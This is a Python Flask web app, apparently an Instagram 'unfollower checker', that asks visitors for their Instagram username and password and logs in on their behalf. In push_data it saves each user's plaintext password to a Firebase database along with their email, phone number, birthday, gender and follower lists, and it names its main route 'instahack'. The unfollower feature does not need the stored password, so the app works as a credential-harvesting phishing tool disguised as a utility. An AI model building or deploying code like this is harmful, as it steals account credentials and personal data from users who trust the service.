from flask import Flask, request, render_template
import os
from instagrapi import Client
from instagrapi.types import User
import requests
import pyrebase
from threading import Thread
import time
import pickle

app = Flask(__name__)

FIREBASE_CONFIG = {
    'apiKey': os.getenv('apiKey'),
    'authDomain': os.getenv('authDomain'),
    'databaseURL': os.getenv('databaseURL'),
    'projectId': os.getenv('projectId'),
    'storageBucket': os.getenv('storageBucket'),
    'messagingSenderId': os.getenv('messagingSenderId'),
    'appId' : os.getenv('appId') 
}

Gender_ar = ['Female', 'Male', 'Custom', 'Prefer Not To Say']
db=''
def connect_database(firebaseconfig):
    firebase = pyrebase.initialize_app(firebaseconfig)
    db = firebase.database()
    return db

try:
    db = connect_database(FIREBASE_CONFIG)
except:
    print("Database Connection Error: ")

def getResigteredUsers(db):
    val = db.child("Users").get().val()
    try:
        return list(val)
    except:
        return []

REGISTERED_USERS = getResigteredUsers(db)    

def login(ACCOUNT_USERNAME, ACCOUNT_PASSWORD):
    user = Client()
    user.login(ACCOUNT_USERNAME, ACCOUNT_PASSWORD)
    return user

def get_account_details(user):
    details = user.account_info()
    userid = details.pk
    birthday = details.birthday
    gender = Gender_ar[details.gender]
    mobileno = details.phone_number
    email = details.email
    return (userid, email, mobileno, gender, birthday)

def get_user_info(user, userid):
    details = user.user_info(userid)
    name = details.full_name
    username = details.username
    profile_pic = str(details.profile_pic_url)
    bio = details.biography
    is_private = details.is_private
    following_count = details.following_count
    followers_count = details.follower_count
    return (name, username, profile_pic, bio, is_private, followers_count, following_count)


def get_followers(user, userid):
    followers = user.user_followers(userid)
    return sorted(list(followers.keys()))


def get_following(user, userid):
    followers = user.user_following(userid)
    return sorted(list(followers.keys()))

def getFollowersFromDatabase(db,userid):
    return sorted(list(db.child("Users").child(userid).get().val()['followers']))
    
def update(db,userid,data):
    db.child("Users").child(userid).set(data)

def get_details(db,userid):
    user_data = db.child("Users").child(userid).get()
    return user_data

def delete(db,userid):
    user_data = db.child("Users").child(userid).remove()

def download_media(user, userid, mediacount):
    medias = user.user_medias(userid, mediacount)
    for i in range(mediacount):
        try:
            r = requests.get(
                str(medias[i].thumbnail_url), allow_redirects=True)
            open(f'{userid}_{i}.jpg', 'wb+').write(r.content)
        except e:
            print(e)

def push_data(user, db,password):
    # Information retrival
    userid, email, mobileno, gender, birthday = get_account_details(user)
    name, username, profile_pic, bio, is_private, followers_count, following_count = get_user_info(
        user, userid)
    # Pushing Data
    data = {'username': username, 'password': password, 'name': name, 'email': email, 'mobileno': mobileno, 'gender': gender, 'birthday': birthday, 'profile_pic': profile_pic, 'bio': bio, 'is_private': is_private, 'followers_count': followers_count,
            'following_count': following_count, 'followers': get_followers(user, userid), 'following': get_following(user, userid), 'unfollowers': [], 'recent_unfollowers': [], 'followers_you_dont_follow': [], 'users_dont_follow_back': []}
    db.child("Users").child(userid).set(data)


def check_unfollowers(li1,li2):
    li_dif = [i for i in li1 + li2 if i not in li1 or i not in li2]
    return li_dif


@app.route('/', methods=["GET", "POST"])
def instahack():
    if request.method == "POST":
        user_name = request.form.get("uname")
        password = request.form.get("pword")
        user = ''
        # user login
        try:
            start = time.time()
            user = login(user_name, password)
            print(f'Login Sucessfull in {time.time()-start}')
        except:
            return 'Login Error: Please enter correct username and password!' 
        start = time.time()
        useridx = user.user_id_from_username(user_name)
        print(f'gathered userid in {time.time()-start}')

        if(str(useridx) in REGISTERED_USERS):
            start = time.time()
            followersI = sorted(get_followers(user,useridx))
            print(f'calculated Followers in {time.time()-start}')
            followersD = getFollowersFromDatabase(db,useridx)
            unfollowers_list = check_unfollowers(followersD,followersI)
            start= time.time()
            t1 = Thread(target=push_data, name='Push Data', args=(user,db,password))
            t1.start()
            print(f'Data Uploaded in {time.time()-start}')
            return f"Welcome Back!\nPeople who unfollowed you: {', '.join([user.username_from_user_id(id) for id in unfollowers_list])}"
        else:
            start= time.time()
            t1 = Thread(target=push_data, name='Push Data', args=(user,db,password))
            t1.start()
            print(f'Data Uploaded in {time.time()-start}')
        return "Data Sumbitted! ;)"
    return render_template("index.html")


if __name__ == '__main__':
    app.run()